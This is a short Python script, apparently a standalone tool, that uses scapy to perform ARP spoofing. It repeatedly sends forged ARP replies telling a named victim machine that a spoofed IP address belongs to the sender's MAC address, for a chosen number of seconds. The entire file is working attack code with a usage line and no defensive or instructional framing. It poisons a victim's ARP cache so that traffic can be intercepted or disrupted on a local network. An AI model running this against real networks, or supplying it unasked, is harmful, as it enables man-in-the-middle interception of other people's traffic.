#!/usr/bin/env python3
"""ARP spoofing: tell the victim 'spoofed_ip is at MY mac'.
usage: arp_spoof.py <iface> <victim_ip> <victim_mac> <spoofed_ip> <seconds>"""
import sys
import time
from scapy.all import Ether, ARP, sendp

iface, victim_ip, victim_mac, spoof_ip, dur = sys.argv[1:6]
pkt = Ether(dst=victim_mac) / ARP(op=2, psrc=spoof_ip, pdst=victim_ip,
                                  hwdst=victim_mac)
end = time.time() + float(dur)
while time.time() < end:
    sendp(pkt, iface=iface, verbose=0)
    time.sleep(0.5)
